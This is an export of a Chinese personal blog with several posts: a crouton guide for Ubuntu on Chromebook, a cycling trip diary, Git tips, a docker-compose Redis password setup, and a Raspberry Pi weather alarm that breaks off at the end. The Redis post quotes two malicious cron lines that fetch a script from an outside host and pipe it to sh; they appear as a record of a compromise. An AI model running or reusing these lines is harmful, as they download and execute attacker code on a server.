<h1 id="crouton"><a href="#crouton" class="headerlink" title="crouton"></a>crouton</h1><p>利用crouton可以在Chrome OS系统内装入Ubuntu系统（可以理解为寄生）。此方法比较简单可以在两种操作系统中方便的来回切换。如果你英文好，可以先去<a href="https://github.com/dnschneid/crouton">crouton的主页</a>好好浏览一下文档。</p>
<h1 id="备份Chrome-OS系统"><a href="#备份Chrome-OS系统" class="headerlink" title="备份Chrome OS系统"></a>备份Chrome OS系统</h1><p><strong>折腾以前一定要对原Chrome OS系统进行备份。</strong><br><strong>折腾以前一定要对原Chrome OS系统进行备份。</strong><br><strong>折腾以前一定要对原Chrome OS系统进行备份。</strong><br>重要的事我说三遍！<br>首先登陆Chrome网上应用商店搜索并下载Chromebook Recovery Utility这个应用，然后准备一个4G以上的U盘插入电脑。打开刚刚下载的应用根据提示做好系统备份。（注：U盘在备份过程中会被格式化。）</p>
<h1 id="开启开发者模式"><a href="#开启开发者模式" class="headerlink" title="开启开发者模式"></a>开启开发者模式</h1><p>进入开发者模式：电源键+esc+刷新键 (第1排左到右第4个键)<br>系统重启后，忽略系统警告：ctrl+d<br>关闭系统验证：ENTER键<br>跳过系统警告：ctrl+d (可能需多按几次)<br>系统开始部署开发者模式环境，大概需要5-10分钟左右完成<br>自动重启后，如果能用ctrl+alt+后退键（第1排第2个键）和 ctrl+alt+前进键（第1排第3个键）来回切换终端与桌面，表示开启成功。</p>
<h1 id="利用crouton安装Ubuntu"><a href="#利用crouton安装Ubuntu" class="headerlink" title="利用crouton安装Ubuntu"></a>利用crouton安装Ubuntu</h1><p>浏览了贴吧各种教程，最终均在这一步失败。主要是因为利用crouton下载Ubuntu时有一部分audio需要连接谷歌的网站所以无法完成安装。此前我们激活所用的代理应该不是全局代理无法在此处翻墙下载。下面为大家提供两种方案：</p>
<h2 id="以下方法适用于cpu为x86架构"><a href="#以下方法适用于cpu为x86架构" class="headerlink" title="以下方法适用于cpu为x86架构"></a>以下方法适用于cpu为x86架构</h2><h3 id="1-ChromeBook已全局翻墙"><a href="#1-ChromeBook已全局翻墙" class="headerlink" title="1.ChromeBook已全局翻墙"></a>1.ChromeBook已全局翻墙</h3><p>首先<a href="https://goo.gl/fd3zc">下载crouton文件</a>（在ChromeBook内点击下载）,文件会放入默认文件夹。<br>然后用Ctrl+ALT+T 调出crosh窗口，输入shell，回车。如果已经成功进入开发者模式，会显示：<br><img src="/images/%E4%B8%80%E5%A4%A9%E4%B8%80%E5%A4%9Cchromebook%E6%8A%98%E8%85%BE%E5%BF%83%E5%BE%9709f77c4e9258d109ba5c010bd358ccbf6d814d6b.jpg"><br>接着输入：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">sudo sh -e ~/Downloads/crouton -r trusty -t keyboard,extension,unity-desktop -m http://mirrors.ustc.edu.cn/ubuntu</span><br></pre></td></tr></table></figure>
<p>其中<code>-m http://mirrors.ustc.edu.cn/ubuntu</code>为加入国内ubuntu下载镜像可以增加下载速度。此处安装的版本较大功能也较全，HP chromebook 14 4G内存，16GSSD使用过程中很流畅。</p>
<h3 id="2-crouton添加audio模块国内下载源"><a href="#2-crouton添加audio模块国内下载源" class="headerlink" title="2.crouton添加audio模块国内下载源"></a>2.crouton添加audio模块国内下载源</h3><p>首先可以参考国内大神的github：<a href="https://github.com/dubuqingfeng/chromebook-for-chinese">https://github.com/dubuqingfeng/chromebook-for-chinese</a><br>我已经根据国内大神的教程改造好文件，在Chromebook进入下载：链接: <a href="https://pan.baidu.com/s/1LjOde5Es3bEPexmnloSgSw">https://pan.baidu.com/s/1LjOde5Es3bEPexmnloSgSw</a> 提取码: 82i5  <strong>(ps:已更新最新版，但是手上没有 ChromeBook 了不确定还能不能用，请自行测试。–2020/01/03–）</strong><br>文件下载后存放在默认文件夹，输入以代码：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/Downloads/</span><br><span class="line">sudo tar -xzf crouton-master.tar.gz</span><br><span class="line">sudo sh -e ~/Downloads/crouton-master/installer/main.sh -r trusty -t keyboard,extension,unity-desktop -m http://mirrors.ustc.edu.cn/ubuntu</span><br></pre></td></tr></table></figure>
<p>两种方法安装到最后都会要求填入用户名和密码。<br>输入以下代码启动ubuntu：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">sudo startunity</span><br></pre></td></tr></table></figure>
<p>如果因为网络问题运行到半截就停下了，也可以试试输入这个进入的命令，也许会提示安装未完成，是否恢复，选择y进行恢复。</p>
<h1 id="怎样进入Ubuntu系统"><a href="#怎样进入Ubuntu系统" class="headerlink" title="怎样进入Ubuntu系统"></a>怎样进入Ubuntu系统</h1><p>1.开机<br>2.登录<br>3.<code>ctrl+alt+t </code><br>4.输入<code>shell</code><br>5.输入<code>sudo startunity</code><br>6.进入</p>
<h1 id="如何切换Chrome-OS和Ubuntu"><a href="#如何切换Chrome-OS和Ubuntu" class="headerlink" title="如何切换Chrome OS和Ubuntu"></a>如何切换Chrome OS和Ubuntu</h1><p>从C到U：shift+ctrl+alt+前进键（第1排第3个键）<br>从U到C：shift+ctrl+alt+后退键（第1排第2个键）</p>
<h1 id="安装ubuntu后bug解决方案"><a href="#安装ubuntu后bug解决方案" class="headerlink" title="安装ubuntu后bug解决方案"></a>安装ubuntu后bug解决方案</h1><p>1.在Chrome OS中shift+alt+T调出crosh窗口，输入<code>shell</code>。<br>2.输入<code>sudo enter-chroot -n trusty</code><br>3.输入<code>sudo apt-get dist-upgrade</code><br>4.Ctrl+D登出<br>5.输入<code>sudo sh -e ~/Downloads/crouton-master/installer/main.sh(下载的哪个文件用哪个文件名） -u -n trusty</code><br>等待更新完成。一般出现的无声音、不能播放视频等BUG都可以解决。<br><strong>注：trusty为版本号，你使用哪个版本填写哪个版本号</strong></p>
<h1 id="ubuntu在终端下更改系统语言"><a href="#ubuntu在终端下更改系统语言" class="headerlink" title="ubuntu在终端下更改系统语言"></a>ubuntu在终端下更改系统语言</h1><p>我曾试过在系统设置中更改系统语言但是失败了，提示说权限不够。所以就在终端中更改系统语言。<br>1.首先安装简体中文语言包</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">sudo apt-get install language-pack-zh-hans language-pack-zh-hans-base language-pack-gnome-zh-hans language-pack-gnome-zh-hans-base</span><br></pre></td></tr></table></figure>
<p>2.然后安装firefox，libreoffice，thunderbird等程序的中文语言包</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">sudo apt-get install `check-language-support -l zh`</span><br></pre></td></tr></table></figure>
<p>3.将locale中的语言设为zh_CN.UTF-8</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">sudo localectl <span class="built_in">set</span>-locale LANG=zh_CN.UTF-<span class="number">8</span></span><br></pre></td></tr></table></figure>
<p>4.重启后生效</p>
<h1 id="备份、恢复及删除crouton下的ubuntu系统"><a href="#备份、恢复及删除crouton下的ubuntu系统" class="headerlink" title="备份、恢复及删除crouton下的ubuntu系统"></a>备份、恢复及删除crouton下的ubuntu系统</h1><p>crouton下的ubuntu系统备份、回复及删除都在Chrome OS下的Shell（<code>ctrl</code>+<code>alt</code>+<code>t</code>进入后输入<code>shell</code>）中操作。</p>
<h2 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo edit-chroot -b trusty</span><br></pre></td></tr></table></figure>
<p><strong>注：trusty为ubuntu的版本名称，即14.04为trusty</strong></p>
<h2 id="恢复"><a href="#恢复" class="headerlink" title="恢复"></a>恢复</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo sh ~/Downloads/crouton -f ~/Downloads/*.tar.gz</span><br></pre></td></tr></table></figure>
<p>*<em>注：将</em>.tar.gz改为你的备份文件名。**</p>
<h2 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo edit-chroot -d trusty</span><br></pre></td></tr></table></figure>
<hr>
<h1 id="参考内容"><a href="#参考内容" class="headerlink" title="参考内容"></a>参考内容</h1><ol>
<li><a href="http://tieba.baidu.com/p/2919742459">【教程】小白是怎样利用crouton给C720 Chromebook装ubuntu的
</a></li>
<li><a href="http://tieba.baidu.com/p/4397782112">【答疑楼】crouton及扩展桌面环境答疑楼</a></li>
<li><a href="https://github.com/dubuqingfeng/chromebook-for-chinese">在中国使用chromebook</a></li>
<li><a href="http://www.linuxdashen.com/ubuntu%E5%A6%82%E4%BD%95%E5%9C%A8%E7%BB%88%E7%AB%AF%E4%B8%8B%E6%9B%B4%E6%94%B9%E7%B3%BB%E7%BB%9F%E8%AF%AD%E8%A8%80">ubuntu如何在终端下更改系统语言</a></li>
</ol>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>ChromeBook</tag>
      </tags>
  </entry>
  <entry>
    <title>一次说走就走的骑行</title>
    <url>/2016/07/06/%E4%B8%80%E6%AC%A1%E8%AF%B4%E8%B5%B0%E5%B0%B1%E8%B5%B0%E7%9A%84%E9%AA%91%E8%A1%8C/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>六月底正式离职了，计划了一次小长途骑行（重庆——昆明），定于七月八号出发，前半段路以多云为主，进入云南境内后天气预报多为中雨，希望预报不准，一路顺顺利利。</p>
<span id="more"></span>
<h1 id="初步计划"><a href="#初步计划" class="headerlink" title="初步计划"></a>初步计划</h1><h2 id="前半段行程"><a href="#前半段行程" class="headerlink" title="前半段行程"></a>前半段行程</h2><p><img src="/images/%E9%AA%91%E8%A1%8C%E6%98%86%E6%98%8E%E9%87%8D%E5%BA%86%E2%80%94%E2%80%94%E6%98%86%E6%98%8E.png"></p>
<h2 id="后半段行程"><a href="#后半段行程" class="headerlink" title="后半段行程"></a>后半段行程</h2><p><img src="/images/%E9%AA%91%E8%A1%8C%E6%98%86%E6%98%8E%E9%87%8D%E5%BA%86%E2%80%94%E2%80%94%E6%98%86%E6%98%8E%20(2).png"></p>
<h1 id="结局"><a href="#结局" class="headerlink" title="结局"></a>结局</h1><p>计划失败了，最初的骑行之旅缩水为重庆——永川往返骑行之旅。虽然没有按照之前的计划完成整个行程，但还是在这次为期三天半的骑行之旅中收获了很多宝贵的经历和经验。</p>
<h2 id="失败原因"><a href="#失败原因" class="headerlink" title="失败原因"></a>失败原因</h2><p>1.毕业一年后来到重庆很少锻炼，买了自行车后也只在最近两个月进行一些二三十公里不痛不痒的小规模恢复训练；<br>2.从未尝试过长途负重骑行；<br>3.以在河南这样平原城市的骑行经验错误的估计了‘山城’重庆的山路。<br>总而言之是自己的眼高手低，准备不足造成最后体力不支无法继续进行接下来的行程。</p>
<hr>
<h1 id="旅途"><a href="#旅途" class="headerlink" title="旅途"></a>旅途</h1><h2 id="第一天"><a href="#第一天" class="headerlink" title="第一天"></a>第一天</h2><p>这次的队友都是贴吧召集的网友，出发前大家都没见过面，只是在微信上简单的聊过。早上五点多就睡不着了，于是起来收拾收拾吃了昨天买的面包和牛奶（出门旅行前一定不要随便更改饮食习惯）。七点半和队友在两路口汇合，还没出市区就因为早上喝的牛奶上吐下泻。上午真的是翻山越岭，爬了差不多三座山，第一座的时候还能拼尽全力一路骑上去。第二座已经累地快推不动了。<br><img src="/images/%E9%AA%91%E8%A1%8C%E6%98%86%E6%98%8Emmexport1468478755009.jpg"><br>翻过第二座山买水休息的时候，从大学城出发的队友已经到达集合点来凤镇。我们也遇到一个永川骑过来的骑友，得知前面那座山有一段很长的石子路。果不其然在费劲千辛万苦，边骑边推到山顶后，正准备享受下坡的风驰电掣却被眼前的烂石子路惊呆了。一路小心翼翼捏紧刹车以体验速降的心情终于安全到达山下。<br><img src="/images/%E9%AA%91%E8%A1%8C%E6%98%86%E6%98%8Emmexport1468478739857.jpg"><br>途中走错一段路最后到达来凤镇已是下午两点，吃过饭后休息一段时间四点左右我们开始了下午的行程。一路还是各种长坡，由于体力不支，我一个人慢慢骑让其他人先行出发。终于在下午八点多到达永川市区。第一天的行程已经把我的体力几乎耗尽。<br><img src="/images/%E9%AA%91%E8%A1%8C%E6%98%86%E6%98%8Emmexport1468478779495.jpg"></p>
<h2 id="第二天"><a href="#第二天" class="headerlink" title="第二天"></a>第二天</h2><p>第二天一早上双腿并未感到不适，错以为自己恢复差不多了。无奈出发十几公里后汗如雨下，喝水的速度赶不上流汗的速度。只好返回永川休息一天再做打算。在永川一觉从上午十一点睡到下午三点多，午饭都没吃。考虑到自己的体力实在跟不上，就放弃了接下来的计划。本来家人朋友都提议让我把车打包寄回家自己做大巴回重庆，我也一度被这个想法俘虏。回去的话又要爬那么多山，三十六七度还是一个人。。。最后我还是下定决心就是推我也要把车推回重庆，这最后一丝尊严不能就这么丢了。</p>
<h2 id="第三天"><a href="#第三天" class="headerlink" title="第三天"></a>第三天</h2><p>一大早起来吃了早饭买好水踏上了归途。考虑到来的时候有一条石子路下坡很难走，就改变了路程，从来凤镇直接向北到达璧山翻过水天池到大学城。从这一天开始真正到了考验自己的时候，三十六七度的烈日，一个人带着二十几斤行李踏上了这条战胜自己心魔的救赎之路。<br>由于没有太多的坡，上午十一点就到达了来凤镇，吃过饭休息一会儿顶着太阳就奔向了璧山。实在太热了，一路走走停停，买的冰水很快都变成了温水。下午三点多到达了璧山，坐在阴凉里，望着前面那座一会儿要翻过去的山，内心真的是风起云涌。<br><img src="/images/%E9%AA%91%E8%A1%8C%E6%98%86%E6%98%8E6.jpg"><br>都说汗水是咸的，我想说流汗流到一定程度汗水就不咸了。<br><img src="/images/%E9%AA%91%E8%A1%8C%E6%98%86%E6%98%8E7.jpg"><br>一度以为自己要热晕或者脱水在爬上的中途，还好山腰上遇到了一家卖水的，一口气喝了一瓶水又买了几包辣条补充盐分。休息了半个小时再次出发，在村民的好心指点下走了一条捷径下山，单行道，坡陡弯大，一路上时不时还要用脚辅助刹车。到了大学城后考虑到还要再翻一座歌乐山才能到市区，就找了一个便宜的旅馆住了下来，明天再慢慢赶路。</p>
<h2 id="半天"><a href="#半天" class="headerlink" title="半天"></a>半天</h2><p>翻山的过程我简单用这几个词概括烈日炎炎，汗如雨下，孤苦伶仃，摇摇欲坠。这其中真正的滋味是无法言表的。上山的时候需要推，下山也要推。下山的坡比昨天更陡弯度更大，中间有一段路还坏了一半，车流量也大，一路心惊胆战的连推带骑速度不超过20km/h的终于到达了磁器口。<br><img src="/images/%E9%AA%91%E8%A1%8C%E6%98%86%E6%98%8E8.jpg"><br><img src="/images/%E9%AA%91%E8%A1%8C%E6%98%86%E6%98%8E5.jpg"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>虽然因为准备不足并未完成最初的骑行昆明之行，但是这次难忘的骑行也让我体会到了很多刻骨铭心的时刻！</p>
]]></content>
      <categories>
        <category>爱好</category>
      </categories>
      <tags>
        <tag>骑行</tag>
      </tags>
  </entry>
  <entry>
    <title>使用 Git 拉取远程仓库分支到本地分支</title>
    <url>/2018/02/09/%E4%BD%BF%E7%94%A8-Git-%E6%8B%89%E5%8F%96%E8%BF%9C%E7%A8%8B%E4%BB%93%E5%BA%93%E5%88%86%E6%94%AF%E5%88%B0%E6%9C%AC%E5%9C%B0%E5%88%86%E6%94%AF/</url>
    <content><![CDATA[<h1 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git checkout -b xxx(本地分支名) yyy(远程仓库名)/zzz(远程仓库分支名)</span><br></pre></td></tr></table></figure>
<p>该方法会将远程仓库 yyy 的 zzz 分支拉取到本地新建分支 xxx，并自动切换到本地分支 xxx。<br><strong>注意：该方法创建的本地分支 xxx 会和远程仓库 yyy 的 zzz 分支建立映射关系</strong></p>
<h1 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git fetch yyy(远程仓库名) zzz(远程仓库分支名):xxx(本地分支名)</span><br></pre></td></tr></table></figure>
<p>该方法会将远程仓库 yyy 的 zzz 分支拉取到本地新建分支 xxx，但不会自动切换到本地分支 xxx。<br><strong>注意：该方法创建的本地分支 xxx 不会和远程仓库 yyy 的 zzz 分支建立映射关系</strong></p>
<span id="more"></span>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="http://blog.csdn.net/tterminator/article/details/52225720">git拉取远程分支并创建本地分支</a></li>
</ul>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>使用 docker-compose 在 Docker 中启动带密码的 Redis</title>
    <url>/2018/09/03/%E4%BD%BF%E7%94%A8-docker-compose-%E5%9C%A8-Docker-%E4%B8%AD%E5%90%AF%E5%8A%A8%E5%B8%A6%E5%AF%86%E7%A0%81%E7%9A%84-Redis/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在服务器上使用 docker-compose 启动一个 Docker 中的 Redis 时，配置文件没有生效，Redis 没有加密码，导致 redis 中被写入两条记录:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*/3 * * * * wget -q -O- http://chrome.zer0day.ru:5050/mrx1 | sh</span><br><span class="line">*/1 * * * * curl -fsSL http://chrome.zer0day.ru:5050/mrx1 | sh</span><br></pre></td></tr></table></figure>
<p>还好及时发现，在此记录一下解决过程。</p>
<span id="more"></span>
<h1 id="解决过程"><a href="#解决过程" class="headerlink" title="解决过程"></a>解决过程</h1><h2 id="方案一"><a href="#方案一" class="headerlink" title="方案一"></a>方案一</h2><p>在 <code>docker-compose.yml</code> 文件中写入下列内容:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis:</span><br><span class="line">  image: redis</span><br><span class="line">  container_name: my_redis</span><br><span class="line">  command: redis-server /usr/local/etc/redis/redis.conf</span><br><span class="line">  ports:</span><br><span class="line">    - &quot;6379:6379&quot;</span><br><span class="line">  volumes:</span><br><span class="line">    - ./data:/data</span><br><span class="line">    - ./redis.conf:/usr/local/etc/redis/redis.conf</span><br></pre></td></tr></table></figure>
<p>其中：</p>
<ol>
<li>image 代表镜像名称；</li>
<li>container_name 代表生成的容器名称；</li>
<li>command 代表生成容器后要执行的命令；</li>
<li>ports 将容器内的端口映射到容器外；</li>
<li>volumes 代表共享目录或文件，冒号前为宿主机目录，冒号后为容器内目录。举例：<code>- ./data:/data</code> 意为将当前目录共享到容器内的 <code>/data</code> 目录，相当于做了一个软连接。</li>
</ol>
<p><strong>注：共享目录或文件时如果宿主机或容器内不存在 docker 会自动帮你创建。</strong><br>Redis 的密码需要自己在与容器共享的配置 <code>redis.conf</code> 中加入，即更改配置中 <code>requirepass</code> 为:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">requirepass yourpassword</span><br></pre></td></tr></table></figure>
<p>在 <code>docker-compose.yml</code>  所在目录下执行 <code>docker-compose up -d</code>，即可在 Docker 中生成一个带密码的 Redis 容器。</p>
<h2 id="方案二"><a href="#方案二" class="headerlink" title="方案二"></a>方案二</h2><p>同样在 <code>docker-compose.yml</code> 中写入下列内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis:</span><br><span class="line">  image: redis</span><br><span class="line">  container_name: my_redis</span><br><span class="line">  command: redis-server --requirepass yourpassword</span><br><span class="line">  ports:</span><br><span class="line">    - &quot;6379:6379&quot;</span><br><span class="line">  volumes:</span><br><span class="line">    - ./data:/data</span><br></pre></td></tr></table></figure>
<p>然后直接在其所在目录下执行 <code>docker-compose up -d</code>，即可在 Docker 中生成一个带密码的 Redis 容器。  </p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>方案一的好处是可以更多的定制 Redis 的配置，方案二的好处是可以快速启动一个带免密的 Docker Redis 实例而不需要依赖外部的 redis.conf。</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Docker</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>利用爬虫和树莓派3打造自己的语音天气闹钟</title>
    <url>/2017/01/21/%E5%88%A9%E7%94%A8%E7%88%AC%E8%99%AB%E5%92%8C%E6%A0%91%E8%8E%93%E6%B4%BE3%E6%89%93%E9%80%A0%E8%87%AA%E5%B7%B1%E7%9A%84%E8%AF%AD%E9%9F%B3%E5%A4%A9%E6%B0%94%E9%97%B9%E9%92%9F/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前不久又一次一个人在他乡过了生日，悄悄买了一台树莓派3送给自己做生日礼物。终于算是实现了大学以来一直的一个小愿望。买回来之后当然不能让他落灰，于是就利用自己的爬虫技术+树莓派+小音箱实现了一个定时闹钟外加语音天气播报功能。</p>
<span id="more"></span>
<h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><ol>
<li>树莓派3</li>
<li>小音箱</li>
</ol>
<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>python 3.4</p>
<h1 id="获取所在位置天气"><a href="#获取所在位置天气" class="headerlink" title="获取所在位置天气"></a>获取所在位置天气</h1><p>这里选择墨迹天气获取实时天气信息，地址：<br><a href="http://tianqi.moji.com/">http://tianqi.moji.com/</a><br>进入墨迹天气的页面，墨迹天气会根据你的ip加载相应地区的天气。<br><img src="/images/%E5%88%A9%E7%94%A8%E7%88%AC%E8%99%AB%E5%92%8C%E6%A0%91%E8%8E%93%E6%B4%BE3%E6%89%93%E9%80%A0%E8%87%AA%E5%B7%B1%E7%9A%84%E8%AF%AD%E9%9F%B3%E5%A4%A9%E6%B0%94%E9%97%B9%E9%92%9F1.png"><br>这次我们主要抓取温度、天气、湿度、风力、空气质量和天气提示这几个数据。<br>这种小爬虫我们就不用Scrap那种重型武器啦，使用requests和BeautifulSoup这两个超级好用的库可以快速实现。<br>首先依次输入下列两行命令安装好requests和BeautifulSoup库。</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">pip3 install requests</span><br><span class="line">pip3 install beautifulsoup4</span><br></pre></td></tr></table></figure>
<p>爬虫代码如下所示：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit&#x27;</span></span><br><span class="line">                      <span class="string">&#x27;/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safar&#x27;</span></span><br><span class="line">                      <span class="string">&#x27;i/537.36&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">res2 = requests.get(<span class="string">&#x27;http://tianqi.moji.com/&#x27;</span>, headers=headers)</span><br><span class="line"></span><br><span class="line">soup = BeautifulSoup(res2.text, <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">temp = soup.find(<span class="string">&#x27;div&#x27;</span>, attrs=&#123;<span class="string">&#x27;class&#x27;</span>: <span class="string">&#x27;wea_weather clearfix&#x27;</span>&#125;).em.getText()</span><br><span class="line">weather = soup.find(<span class="string">&#x27;div&#x27;</span>, attrs=&#123;<span class="string">&#x27;class&#x27;</span>: <span class="string">&#x27;wea_weather clearfix&#x27;</span>&#125;).b.getText()</span><br><span class="line">sd = soup.find(<span class="string">&#x27;div&#x27;</span>, attrs=&#123;<span class="string">&#x27;class&#x27;</span>: <span class="string">&#x27;wea_about clearfix&#x27;</span>&#125;).span.getText()</span><br><span class="line">sd_num = re.search(<span class="string">r&#x27;\d+&#x27;</span>, sd).group()</span><br><span class="line">sd = sd.replace(sd_num, sd_num_zh)</span><br><span class="line">wind = soup.find(<span class="string">&#x27;div&#x27;</span>, attrs=&#123;<span class="string">&#x27;class&#x27;</span>: <span class="string">&#x27;wea_about clearfix&#x27;</span>&#125;).em.getText()</span><br><span class="line">aqi = soup.find(<span class="string">&#x27;div&#x27;</span>, attrs=&#123;<span class="string">&#x27;class&#x27;</span>: <span class="string">&#x27;wea_alert clearfix&#x27;</span>&#125;).em.getText()</span><br><span class="line">aqi_num = re.search(<span class="string">r&#x27;\d+&#x27;</span>, aqi).group()</span><br><span class="line">aqi = aqi.replace(aqi_num, aqi_num_zh)</span><br><span class="line">info = soup.find(<span class="string">&#x27;div&#x27;</span>, attrs=&#123;<span class="string">&#x27;class&#x27;</span>: <span class="string">&#x27;wea_tips clearfix&#x27;</span>&#125;).em.getText()</span><br><span class="line">sd = sd.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;百分之&#x27;</span>).replace(<span class="string">&#x27;%&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">aqi = <span class="string">&#x27;aqi&#x27;</span> + aqi</span><br><span class="line"></span><br><span class="line">today = datetime.now().date().strftime(<span class="string">&#x27;%Y年%m月%d日&#x27;</span>)</span><br><span class="line">text = <span class="string">&#x27;早上好！今天是%s,天气%s,温度%s摄氏度,%s,%s,%s,%s&#x27;</span> % \</span><br><span class="line">       (today, weather, temp, sd, wind, aqi, info)</span><br></pre></td></tr></table></figure>
<p>至于Requests和Beautiful Soup的用法这里就先不多说了，大家可以去看他们的中文文档。</p>
<ol>
<li><a href="http://docs.python-requests.org/zh_CN/latest/index.html">Requests中文wendnag</a></li>
<li><a href="http://beautifulsoup.readthedocs.io/zh_CN/latest/">Beautiful Soup中文文档</a></li>
</ol>
<h1 id="命令行播放语音"><a href="#命令行播放语音" class="headerlink" title="命令行播放语音"></a>命令行播放语音</h1><p>使用mplayer实现语音播放,通过以下命令安装mplayer:</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">sudo apt-get install mplayer</span><br></pre></td></tr></table></figure>
<p>用法很简单输入以下命令即可播放本地音乐：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mplayer \xxx\xxx\xxx.mp3(绝对地址)</span><br></pre></td></tr></table></figure>
<p>如果是在线音乐也可以用mplayer直接通过URL播放：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mplayer &quot;URl&quot;(URL外面一定要用双引号圈起来)</span><br></pre></td></tr></table></figure>

<h1 id="文字转语音"><a href="#文字转语音" class="headerlink" title="文字转语音"></a>文字转语音</h1><p>刚开始想通过python的库实现本地文字转语音，在windows系统下没有问题，但树莓派3上中文无法转换。后来就找到了百度的文字转换语音API，地址：<a href="http://yuyin.baidu.com/#try">http://yuyin.baidu.com/#try</a><br>还可以选各种声音，调节语速。虽然它没有给出直接的api接口，但是我们利用Chrome浏览器的开发者模式可以找到api。<br><img src="/images/%E5%88%A9%E7%94%A8%E7%88%AC%E8%99%AB%E5%92%8C%E6%A0%91%E8%8E%93%E6%B4%BE3%E6%89%93%E9%80%A0%E8%87%AA%E5%B7%B1%E7%9A%84%E8%AF%AD%E9%9F%B3%E5%A4%A9%E6%B0%94%E9%97%B9%E9%92%9F2.png"><br>打开开发者模式，点击播放的按钮，在network里就可以找到刚刚发出的请。<br><a href="http://tts.baidu.com/text2audio?idx=1&tex=1&cuid=baidu_speech_demo&cod=2&lan=zh&ctp=1&pdt=1&spd=5&per=4&vol=5&pit=5">http://tts.baidu.com/text2audio?idx=1&amp;tex=1&amp;cuid=baidu_speech_demo&amp;cod=2&amp;lan=zh&amp;ctp=1&amp;pdt=1&amp;spd=5&amp;per=4&amp;vol=5&amp;pit=5</a>就我们要找的百度文字转语音API,其中per是参数是语音的类型，spd是语速，vol是音量，而tex则是需要转换的文字。通过以下代码就可以实现将特定的文字转换为语音。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">  </span><br><span class="line">url = <span class="string">u&#x27;http://tts.baidu.com/text2audio?idx=1&amp;tex=&#123;0&#125;&amp;cuid=baidu_speech_&#x27;</span> \</span><br><span class="line">      <span class="string">u&#x27;demo&amp;cod=2&amp;lan=zh&amp;ctp=1&amp;pdt=1&amp;spd=4&amp;per=4&amp;vol=5&amp;pit=5&#x27;</span>.<span class="built_in">format</span>(text)</span><br><span class="line">os.system(<span class="string">&#x27;mplayer &quot;%s&quot;&#x27;</span> % url)</span><br></pre></td></tr></table></figure>
<h1 id="实现定时播放语音"><a href="#实现定时播放语音" class="headerlink" title="实现定时播放语音"></a>实现定时播放语音</h1><p>我们使用crontab来实现每天定时启动程序。</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="number">30</span> <span class="number">07</span> * * * /usr/bin/python3 /home/pi/Documens/Python/weather_voice.py</span><br></pre></td></tr></table></figure>
<p><strong>Ps:注意crontab中的路径要使用绝对路径。</strong><br>具体的crontab用法就不在这里一一讲解了，大家随便搜索一下就有很多。</p>
<h1 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h1><p>中间还遇到了一些小bug，比如说语音转文字的过程中数字只能一个一个的念出来，做为一个完美主义者肯定不能忍受这个，12摄氏度给我播报成一二摄氏度怎么行！！！所以就写了一个小函数专门转换数字为中文。最后所有的代码整合起来就是这样啦。</p>
